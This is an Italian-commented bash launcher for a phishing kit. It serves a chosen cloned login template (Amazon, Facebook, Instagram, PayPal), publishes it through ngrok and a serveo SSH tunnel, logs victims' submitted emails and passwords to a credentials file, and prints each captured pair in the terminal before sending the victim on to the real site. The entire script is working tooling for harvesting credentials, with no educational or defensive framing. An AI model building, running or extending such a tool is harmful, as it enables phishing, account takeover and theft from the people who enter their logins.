#!/usr/bin/env bash

# Script: start_tool.sh
# Scopo: avvia server Flask, ngrok, PHP server e serveo, gestisce selezione template e file credenziali
# Uso: ./start_tool.sh

set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
TEMPLATES_DIR="$ROOT_DIR/templates"
CRED_DIR="$ROOT_DIR/credenziali"
INDEX_PHP="$ROOT_DIR/index.php"
SERVER_PY="$ROOT_DIR/server.py"
NGROK_CMD="ngrok" # Assumi ngrok installato e nel PATH
DEBUG_DIR="$ROOT_DIR/debug"

# Color definitions usate nello script
GREEN='\033[0;32m'
NC='\033[0m'

# Se impostato a 1 evita di ristampare le stesse credenziali multiple volte
# Per disabilitare: export SUPPRESS_DUP_CREDS=0
SUPPRESS_DUP_CREDS=${SUPPRESS_DUP_CREDS:-1}

# Variabili per evitare stampe duplicate (popolate dal watcher)
# LAST_CRED_KEY contiene una stringa normalizzata email||password dell'ultima stampata
LAST_CRED_KEY=""
# Debounce: tempo minimo (s) durante il quale non ristampare la stessa credenziale
DEBOUNCE_SECONDS=${DEBOUNCE_SECONDS:-2}
# Timestamp dell'ultima stampa della chiave
LAST_CRED_TS=0

# Cleanup function per terminare i processi lanciati
PIDS=()

function cleanup() {
  # Ripristino index.php da backup se presente e termino i processi
  if [ -f "$DEBUG_DIR/index.php.bak" ]; then
    mv -f "$DEBUG_DIR/index.php.bak" "$INDEX_PHP" || true
  fi
  # Rimuovi FIFO watcher se presente
  if [ -p "$DEBUG_DIR/creds.fifo" ]; then
    rm -f "$DEBUG_DIR/creds.fifo" || true
  fi
  # Assicura di uccidere eventuali watcher residui (tail/reader)
  pkill -f "tail -n0 -F .*Credenziali_.*.txt" >/dev/null 2>&1 || true
  pkill -f "creds.fifo" >/dev/null 2>&1 || true
    # Termina i PIDs registrati
    for pid in "${PIDS[@]}"; do
      if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
        kill "$pid" 2>/dev/null || true
      fi
    done
    # Tentativo più aggressivo: termina processi noti che lo script avvia
    pkill -f "ngrok" >/dev/null 2>&1 || true
    pkill -f "php -S localhost:8000" >/dev/null 2>&1 || true
    pkill -f "ssh -o StrictHostKeyChecking=no -R 80:localhost:8000 serveo.net" >/dev/null 2>&1 || true
    pkill -f "serveo.net" >/dev/null 2>&1 || true
    pkill -f "python3 .*server.py" >/dev/null 2>&1 || true
  sleep 1
  exit 0
}

  # Assicura che la cleanup venga eseguita anche se lo script viene interrotto
  trap cleanup INT TERM EXIT

function print_header() {
  echo "-----------------------------------------"
  echo "$1"
  echo "-----------------------------------------"
}

# Mostra lista dei template e seleziona
print_header "Seleziona il sito template da servire"
# Costruisci array templates in modo compatibile con bash 3.2 (macOS)
templates=()
if [ -d "$TEMPLATES_DIR" ]; then
  while IFS= read -r -d $'\0' file; do
    templates+=("$(basename "$file")")
  done < <(find "$TEMPLATES_DIR" -maxdepth 1 -type f -name '*.html' -print0 2>/dev/null)
fi

if [ ${#templates[@]} -eq 0 ]; then
  echo "Nessun template trovato in $TEMPLATES_DIR"
  exit 1
fi

for i in "${!templates[@]}"; do
  idx=$((i+1))
  echo "[$idx] ${templates[i]}"
done

read -p "Numero scelta: " choice
re='^[0-9]+$'
if ! [[ $choice =~ $re ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt ${#templates[@]} ]; then
  echo "Scelta non valida"
  exit 1
fi
sel_index=$((choice-1))
TEMPLATE_FILE="${templates[$sel_index]}"
SITE_NAME="${TEMPLATE_FILE%%.*}"

print_header "Scelta: $TEMPLATE_FILE (site: $SITE_NAME)"

# Aggiorna immediatamente index.php per usare il fallback locale (127.0.0.1:5001)
# Questo evita che un valore hardcoded precedente di $ngrok_url punti ad un tunnel
# pubblico che serve un template sbagliato (es. Facebook) prima che ngrok venga avviato.
if [ -f "$INDEX_PHP" ]; then
  mkdir -p "$DEBUG_DIR"
  # Salva backup se non presente
  if [ ! -f "$DEBUG_DIR/index.php.bak" ]; then
    cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true
  fi
  awk -v url="http://127.0.0.1:5001" '{ if ($0 ~ /^\s*\$ngrok_url\s*=.*/) { print "\$ngrok_url = \047" url "\047;" } else { print $0 } }' "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" && mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
fi

# Crea cartella credenziali
mkdir -p "$CRED_DIR"
CREDENTIALS_FILE="$CRED_DIR/Credenziali_${SITE_NAME}.txt"

# Imposta variabili per server.py
export TEMPLATE_NAME="$TEMPLATE_FILE"
export CREDENTIALS_FILE="$CREDENTIALS_FILE"

# Assicurati che il file delle credenziali esista e avvia un watcher che mostra
# nuove credenziali nel terminale in verde quando viene aggiunta una nuova riga.
touch "$CREDENTIALS_FILE"

start_cred_watcher() {
  # Usa una FIFO per separare tail (writer) e reader, così catturiamo PID distinti
  mkdir -p "$DEBUG_DIR"
  FIFO="$DEBUG_DIR/creds.fifo"
  if [ -p "$FIFO" ]; then
    rm -f "$FIFO" || true
  fi
  mkfifo "$FIFO"

  # Avvia tail che scrive sulla FIFO
  tail -n0 -F "$CREDENTIALS_FILE" > "$FIFO" 2>/dev/null &
  TAIL_PID=$!
  PIDS+=("$TAIL_PID")

  # Avvia il reader che legge dalla FIFO e processa le righe
  (
    while IFS= read -r line < "$FIFO"; do
      [ -z "$line" ] && continue
      # Proviamo a estrarre email/telefono e password usando il formato conosciuto
      email=$(echo "$line" | sed -n "s/.*Email\/Telefono:\s*\([^,]*\),\s*Password:\s*\(.*\)/\1/p")
      password=$(echo "$line" | sed -n "s/.*Email\/Telefono:\s*\([^,]*\),\s*Password:\s*\(.*\)/\2/p")
      if [ -z "$email" ] || [ -z "$password" ]; then
        # fallback: split su virgola
        email=$(echo "$line" | awk -F',' '{print $1}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        password=$(echo "$line" | awk -F',' '{print $2}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
      fi
      # Pulizia eventuali label residue
      email=$(echo "$email" | sed -E 's/^([^:]*:)?\s*//')
      password=$(echo "$password" | sed -E 's/^([^:]*:)?\s*//')

      # Normalizza email e password per confronto (trim, collapse spaces, lowercase)
      norm_email=$(echo "$email" | tr '\r' '\n' | tr -s ' ' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | tr '[:upper:]' '[:lower:]')
      norm_pass=$(echo "$password" | tr '\r' '\n' | tr -s ' ' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' )
      key="${norm_email}||${norm_pass}"

      if [ "${SUPPRESS_DUP_CREDS}" = "1" ]; then
        if [ "$key" = "$LAST_CRED_KEY" ]; then
          continue
        fi
      fi
      LAST_CRED_KEY="$key"

      # Stampa in terminale (solo label in verde)
      echo -e "${GREEN}Credenziali trovate${NC}"
      echo "username: $email"
      echo "password: $password"
    done
  ) &
  READER_PID=$!
  PIDS+=("$READER_PID")
}

# Avvia il watcher di credenziali
start_cred_watcher
# Scegli URL di redirect in base al sito (semplice mappa, estendibile)
case "$SITE_NAME" in
  amazon)
    REDIRECT_URL="https://www.amazon.com"
    ;;
  Facebook|facebook)
    REDIRECT_URL="https://www.facebook.com"
    ;;
  insta|instagram)
    REDIRECT_URL="https://www.instagram.com"
    ;;
  paypal)
    REDIRECT_URL="https://www.paypal.com"
    ;;
  *)
    REDIRECT_URL="https://www.google.com"
    ;;
esac
export REDIRECT_URL

# Aggiorna index.php con placeholder temporaneo e poi sostituisci
# Salva copia di backup
# Crea cartella debug per log/backup/temp
mkdir -p "$DEBUG_DIR"
cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true
# Sostituisci il placeholder __NGROK_URL__ nel file index.php con uno temporaneo
# Lo script metterà l'URL reale dopo che ngrok sarà avviato
# Lo script metterà l'URL reale dopo che ngrok sarà avviato

# Verifica che python3 esista
if ! command -v python3 >/dev/null 2>&1; then
  echo "python3 non trovato nel PATH. Installa Python3 prima di procedere." >&2
  exit 1
fi

# Controlla se Flask è installato; se no, prova a installarlo (interattivo)
# If there's a local virtualenv .venv, activate it so the script uses the project
# environment (avoids the "flask not installed" message when Flask is in .venv).
if [ -f "$ROOT_DIR/.venv/bin/activate" ]; then
  echo "Attivo virtualenv locale .venv"
  # shellcheck disable=SC1091
  # shell will source the activate script from the project venv
  # Use a subshell-safe source
  # Note: this changes the shell environment of this script only.
  source "$ROOT_DIR/.venv/bin/activate" || true
fi

if ! python3 -c "import flask" >/dev/null 2>&1; then
  cat <<'MSG'
Il modulo Python 'flask' non è installato nel tuo ambiente Python attuale.

Per evitare di modificare il Python gestito dal sistema, crea e usa un virtual environment locale e installa Flask lì:

  python3 -m venv .venv
  source .venv/bin/activate
  pip install --upgrade pip
  pip install flask

Poi rilancia questo script all'interno dell'ambiente virtuale (./start_tool.sh).

Se preferisci forzare l'installazione nel sistema (non raccomandato), puoi usare:
  python3 -m pip install --break-system-packages flask

MSG
  exit 1
fi

# Avvia server Flask (reindirizza log in debug/server.log per non inquinare il terminale)
print_header "Avvio Flask server (server.py) sulla porta 5001"
mkdir -p "$DEBUG_DIR"
python3 "$SERVER_PY" > "$DEBUG_DIR/server.log" 2>&1 &
PIDS+=("$!")
sleep 1

# Avvia ngrok sulla porta 5001
print_header "Avvio ngrok sulla porta 5001"
$NGROK_CMD http 5001 --log=stdout > "$DEBUG_DIR/ngrok.log" 2>&1 &
PIDS+=("$!")

# Attendi che ngrok sia pronto e usa l'API locale per ottenere l'URL pubblico (più robusto)
NGROK_URL=""
for i in {1..20}; do
  sleep 1
  # Prova l'API web di ngrok: http://127.0.0.1:4040/api/tunnels
  NGROK_JSON=$(curl -s http://127.0.0.1:4040/api/tunnels || true)
  if [ -n "$NGROK_JSON" ]; then
    NGROK_URL=$(echo "$NGROK_JSON" | python3 -c "import sys,json
d=sys.stdin.read()
try:
  obj=json.loads(d)
  for t in obj.get('tunnels',[]):
    pu=t.get('public_url')
    if pu and ('ngrok' in pu or 'ngrok-free' in pu):
      print(pu)
      break
except:
  pass
") || true
  fi
  if [ -n "$NGROK_URL" ]; then
    break
  fi
done

if [ -z "$NGROK_URL" ]; then
  # Fallback: prova parsare il log
  if [ -f "$DEBUG_DIR/ngrok.log" ]; then
    NGROK_URL=$(grep -Eo "https?://[^\"']+ngrok[^\"']+" "$DEBUG_DIR/ngrok.log" | head -n1 || true)
  fi
fi

# Esporta NGROK_URL per far sì che index.php lo usi via getenv() invece di dover riscrivere il file
export NGROK_URL

if [ -z "$NGROK_URL" ]; then
  echo "Non sono riuscito a leggere l'URL di ngrok automaticamente; controlla $ROOT_DIR/ngrok.log"
else
  # Forza la sostituzione della riga che assegna $ngrok_url in index.php
  if [ -f "$INDEX_PHP" ]; then
    # Crea backup se non presente
    if [ ! -f "$DEBUG_DIR/index.php.bak" ]; then
      cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true
    fi
    # Usa sed per sostituire la riga di assegnazione $ngrok_url = '...';
    # Usa un separatore @ per evitare problemi con URL contenenti / e imposta LC_ALL per stabilità
    LC_ALL=C sed -E "s@\$ngrok_url\s*=\s*'[^']*'\s*;@\$ngrok_url = '$NGROK_URL';@" "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" || true
    if [ -s "$DEBUG_DIR/index.php.tmp" ]; then
      mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
      echo "[INFO] Wrote NGROK_URL=$NGROK_URL into $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
      echo "[INFO] Wrote NGROK_URL=$NGROK_URL into $INDEX_PHP"
    else
      echo "[WARN] sed replace produced empty tmp; not overwriting $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
      echo "[WARN] sed replace produced empty tmp; not overwriting $INDEX_PHP"
    fi
  fi
fi

if [ -z "$NGROK_URL" ] && [ -f "$INDEX_PHP" ]; then
  # Se non abbiamo NGROK_URL, assicuriamoci che index.php contenga il fallback locale
  # Se non abbiamo NGROK_URL, imposta il fallback tramite sed
  NGROK_URL='http://127.0.0.1:5001'
  LC_ALL=C sed -E "s@\$ngrok_url\s*=\s*'[^']*'\s*;@\$ngrok_url = '$NGROK_URL';@" "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" || true
  if [ -s "$DEBUG_DIR/index.php.tmp" ]; then
    mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
    echo "[INFO] No NGROK_URL detected: set fallback http://127.0.0.1:5001 in $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
    echo "[INFO] Set fallback http://127.0.0.1:5001 in $INDEX_PHP"
  else
    echo "[WARN] sed fallback produced empty tmp; not overwriting $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
    echo "[WARN] sed fallback produced empty tmp; not overwriting $INDEX_PHP"
  fi
fi

# Avvia PHP server in background
print_header "Avvio PHP server su localhost:8000"
# Verifica sintassi PHP del file index.php prima di avviare il server
  if command -v php >/dev/null 2>&1; then
  if ! php -l "$INDEX_PHP" > /dev/null 2>&1; then
    echo "Errore di sintassi in $INDEX_PHP. Ecco il dettaglio:"
    php -l "$INDEX_PHP" || true
    # ripristina backup se presente
    if [ -f "$DEBUG_DIR/index.php.bak" ]; then
      mv -f "$DEBUG_DIR/index.php.bak" "$INDEX_PHP"
      echo "Ripristinato $INDEX_PHP da backup."
    fi
    cleanup
  fi
else
  echo "php non trovato nel PATH: non posso controllare la sintassi di $INDEX_PHP"
fi
php -S localhost:8000 > "$DEBUG_DIR/php.log" 2>&1 &
PIDS+=("$!")
sleep 1

# Avvia serveo (ssh -R)
print_header "Avvio serveo (ssh -R 80:localhost:8000 serveo.net)"
ssh -o StrictHostKeyChecking=no -R 80:localhost:8000 serveo.net > "$DEBUG_DIR/serveo.log" 2>&1 &
PIDS+=("$!")

# Estrai URL di serveo dal log
SERVEO_URL=""
for i in {1..20}; do
  sleep 1
  if grep -q "Forwarding HTTP traffic from" "$DEBUG_DIR/serveo.log" 2>/dev/null; then
    SERVEO_URL=$(grep -Eo "https?://[a-zA-Z0-9.-]+\.serveo\.net" "$DEBUG_DIR/serveo.log" | head -n1 || true)
  fi
  if [ -n "$SERVEO_URL" ]; then
    break
  fi
done

if [ -n "$SERVEO_URL" ]; then
  # Stampa la label in verde e reset del colore prima dell'URL
  echo -e "${GREEN}Apri questo URL nel browser per trovare il sito:${NC} $SERVEO_URL"
else
  echo "Non sono riuscito a estrarre l'URL di serveo automaticamente. Controlla $ROOT_DIR/serveo.log"
fi

# Trap per terminare i processi lanciati
# cleanup function defined earlier; trap set later

trap cleanup INT TERM

# Mantieni lo script vivo fino a Ctrl-C
while true; do
  sleep 1
done
